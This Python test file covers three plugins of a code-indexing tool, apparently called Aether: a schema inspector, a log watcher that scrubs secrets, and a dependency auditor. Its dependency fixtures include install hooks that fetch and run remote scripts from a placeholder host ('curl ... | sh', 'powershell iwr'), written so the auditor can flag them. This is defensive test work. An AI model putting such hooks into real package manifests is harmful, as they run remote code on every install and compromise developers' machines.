"""v0.2 · #3 official plugins: db_schema_inspector, runtime_log_watcher, dep_auditor."""

from __future__ import annotations

import json
import sqlite3
from pathlib import Path

from aether_core.kernel import AetherKernel
from plugins.base import PluginManager
from plugins.db_schema_inspector import parse_prisma, parse_python_models, parse_sql_ddl
from plugins.dep_auditor import audit_package_json, audit_requirements, classify_npm_version, classify_python_spec
from plugins.runtime_log_watcher import normalise_message, parse_log
from tests.conftest import fake_secret

SQL = """-- users and orders
CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY,
    email TEXT NOT NULL UNIQUE,
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
CREATE TABLE orders (
    id BIGINT,
    user_id INTEGER NOT NULL REFERENCES users(id),
    total_cents NUMERIC(10, 2),
    PRIMARY KEY (id)
);
"""
PRISMA = """model Invoice {
  id        Int      @id @default(autoincrement())
  number    String   @unique
  customer  Customer @relation(fields: [customerId], references: [id])
  customerId Int
  paidAt    DateTime?
  @@map("invoices")
}

enum Status {
  PAID
  OPEN
}
"""
MODELS = '''from pydantic import BaseModel
from sqlalchemy import Column, ForeignKey, Integer, String
from sqlalchemy.orm import Mapped, declarative_base, mapped_column

Base = declarative_base()


class Account(Base):
    __tablename__ = "accounts"
    id = Column(Integer, primary_key=True)
    owner_id = Column(Integer, ForeignKey("users.id"), nullable=False)
    label: Mapped[str] = mapped_column(String(80))


class AccountOut(BaseModel):
    id: int
    label: str | None = None
'''


def _run(kernel: AetherKernel, name: str) -> dict:
    result = PluginManager(kernel).run_named(name)
    assert result.ok, result.error
    return result.summary


# ---------------------------------------------------------------------------- db schema


def test_schema_parsers_extract_structure() -> None:
    users, orders = parse_sql_ddl(SQL)
    assert [c["name"] for c in users["columns"]] == ["id", "email", "created_at"]
    assert users["columns"][0]["primary_key"] and not users["columns"][1]["nullable"]
    assert orders["columns"][0]["primary_key"] and orders["columns"][1]["references"] == "users"
    assert orders["columns"][2]["type"] == "NUMERIC(10, 2)"
    invoice, status = parse_prisma(PRISMA)
    assert invoice["name"] == "invoices" and invoice["model"] == "Invoice"
    assert {c["name"]: c["nullable"] for c in invoice["columns"]}["paidAt"] is True
    assert status["kind"] == "enum" and [c["name"] for c in status["columns"]] == ["PAID", "OPEN"]
    account, out = parse_python_models(MODELS)
    assert account["name"] == "accounts" and account["orm"] == "sqlalchemy"
    cols = {c["name"]: c for c in account["columns"]}
    assert cols["id"]["primary_key"] and cols["owner_id"]["references"] == "users.id" and cols["label"]["type"] == "String(80)"
    assert out["kind"] == "schema" and out["orm"] == "pydantic"


def test_db_schema_inspector_indexes_structure_never_data(kernel: AetherKernel) -> None:
    root = kernel.root
    (root / "db").mkdir()
    (root / "db" / "schema.sql").write_text(SQL, encoding="utf-8")
    (root / "prisma").mkdir()
    (root / "prisma" / "schema.prisma").write_text(PRISMA, encoding="utf-8")
    (root / "app" / "db_models.py").write_text(MODELS, encoding="utf-8")
    sentinel = "row-data-must-never-leak-7781"
    conn = sqlite3.connect(root / "local.sqlite3")
    conn.execute("CREATE TABLE audit_log (id INTEGER PRIMARY KEY, actor TEXT NOT NULL, note TEXT)")
    conn.execute("INSERT INTO audit_log(actor, note) VALUES (?, ?)", ("bob", sentinel))
    conn.commit()
    conn.close()
    kernel.index(run_plugins=False)
    summary = _run(kernel, "db_schema_inspector")
    assert summary["sources"] == {"sql": 1, "prisma": 1, "python": 1, "sqlite": 1}
    tables = {n.name: n for n in kernel.db.nodes_by_kind("table")}
    assert {"users", "orders", "invoices", "accounts", "audit_log"} <= set(tables)
    assert "actor TEXT NOT NULL" in tables["audit_log"].signature
    assert sentinel not in json.dumps([n.body + n.signature + json.dumps(n.metadata) for n in tables.values()])
    pkg = kernel.query_smart_context("audit_log table actor column")
    assert any(r["symbol"].endswith("audit_log") for r in pkg["results"])
    # virtual records survive a plugin-less re-index and are pruned when the source disappears
    kernel.index(run_plugins=False)
    assert any(f.path == "@aether/db_schema/prisma/schema.prisma" for f in kernel.db.list_files())
    (root / "prisma" / "schema.prisma").unlink()
    assert _run(kernel, "db_schema_inspector")["pruned"] == 1
    assert "invoices" not in {n.name for n in kernel.db.nodes_by_kind("table")}


# ---------------------------------------------------------------------------- runtime logs


def test_log_parsing_and_normalisation() -> None:
    text = "\n".join([
        "2026-11-18 10:00:01 INFO started",
        "Traceback (most recent call last):",
        '  File "app/payments.py", line 7, in charge_customer',
        "ValueError: amount must be positive (got -5)",
        "TypeError: Cannot read properties of undefined (reading 'id')",
        "    at fetchUser (src/api/client.ts:8:11)",
        "2026-11-18 10:00:02 ERROR Database timeout after 3000 ms for user 42",
    ])
    fails = parse_log(text)
    assert [f.etype for f in fails] == ["ValueError", "TypeError", "ERROR"]
    assert fails[0].frames == [("app/payments.py", 7, "charge_customer")]
    assert fails[1].frames[0][0] == "src/api/client.ts"
    assert normalise_message("user 42 not found in 'eu-west'") == normalise_message("user 97 not found in 'us-east'")


def test_runtime_log_watcher_creates_preventive_scars(kernel: AetherKernel) -> None:
    secret = fake_secret("ghp_", 36)
    tb = ("Traceback (most recent call last):\n"
          f'  File "{(kernel.root / "app" / "payments.py").as_posix()}", line 7, in charge_customer\n'
          "ValueError: amount must be positive (invoice {n}, token " + secret + ")\n")
    logs = kernel.root / "logs"
    logs.mkdir()
    (logs / "app.log").write_text("".join(tb.replace("{n}", str(i)) for i in range(6))
                                  + "ERROR one-off glitch that happened once\n", encoding="utf-8")
    summary = _run(kernel, "runtime_log_watcher")
    assert summary["logs_read"] == 2 and len(summary["recurring_errors"]) == 1  # logs/app.log + fixture debug.log
    rec = summary["recurring_errors"][0]
    assert rec["file"] == "app/payments.py" and rec["symbol"] == "charge_customer" and rec["count"] == 6
    scars = [s for s in kernel.check_scars("app/payments.py") if s["source"] == "runtime_log"]
    assert len(scars) == 1 and scars[0]["severity"] == "medium" and "6x" in scars[0]["fix_applied"]
    assert secret not in json.dumps(scars) and secret not in json.dumps(summary)
    # re-running does not duplicate the scar
    _run(kernel, "runtime_log_watcher")
    assert len([s for s in kernel.check_scars("app/payments.py") if s["source"] == "runtime_log"]) == 1


# ---------------------------------------------------------------------------- dependency audit


def test_dependency_classifiers() -> None:
    assert classify_python_spec("requests")[2] == "medium"
    assert classify_python_spec("httpx>=0.27")[2] == "low"
    assert classify_python_spec("numpy==1.26.4") is None and classify_python_spec("rich>=13,<14") is None
    assert classify_python_spec("lib @ git+https://example.test/lib.git")[2] == "high"
    assert classify_npm_version("*")[1] == "medium" and classify_npm_version("latest")[1] == "medium"
    assert classify_npm_version("github:user/repo")[1] == "high" and classify_npm_version("^18.3.1") is None
    findings = audit_requirements("--extra-index-url https://pkgs.example.test/simple\nflask\nrequests==2.32.3 --hash=sha256:abc\n")
    assert [f["severity"] for f in findings] == ["high", "medium"]
    pkg, stats = audit_package_json(json.dumps({
        "dependencies": {"react": "^18.3.1", "left-pad": "*"},
        "scripts": {"postinstall": "node scripts/setup.js && curl -s https://x.test/i.sh | sh", "build": "tsc"},
    }))
    assert {f["severity"] for f in pkg} == {"medium", "critical"} and stats["caret_or_tilde"] == 1


def test_dep_auditor_plugin_reports_and_replaces_findings(kernel: AetherKernel) -> None:
    (kernel.root / "pyproject.toml").write_text(
        '[project]\nname = "svc"\ndependencies = ["fastapi>=0.110", "requests", "numpy==1.26.4"]\n'
        '[project.optional-dependencies]\ndev = ["pytest"]\n', encoding="utf-8")
    (kernel.root / "requirements.txt").write_text("--extra-index-url https://pkgs.example.test/simple\nuvicorn\n", encoding="utf-8")
    pkg = json.loads((Path(kernel.config.linked_repos[0]["path"]) / "package.json").read_text(encoding="utf-8"))
    pkg["scripts"]["preinstall"] = "powershell -c iwr https://x.test/a.ps1"
    pkg["dependencies"]["chalk"] = "latest"
    (Path(kernel.config.linked_repos[0]["path"]) / "package.json").write_text(json.dumps(pkg), encoding="utf-8")
    kernel.index(run_plugins=False)
    summary = _run(kernel, "dep_auditor")
    assert summary["manifests"] == 3 and summary["status"] == "high"
    by_file = {r["file"]: r for r in summary["reports"]}
    assert {f["package"] for f in by_file["pyproject.toml"]["findings"]} == {"fastapi", "requests", "pytest"}
    assert by_file["requirements.txt"]["findings"][0]["severity"] == "high"
    issues = {f["section"]: f for f in by_file["package.json"]["findings"]}
    assert issues["scripts.preinstall"]["severity"] == "high" and issues["dependencies"]["package"] == "chalk"
    before = kernel.db.security_counts()["dependency"]
    _run(kernel, "dep_auditor")
    assert kernel.db.security_counts()["dependency"] == before == summary["findings"]
    assert kernel.get_telemetry_stats()["dependency_findings"] == before


def test_new_plugins_are_discovered(kernel: AetherKernel) -> None:
    names = {p["name"] for p in PluginManager(kernel).describe()}
    assert {"db_schema_inspector", "runtime_log_watcher", "dep_auditor"} <= names
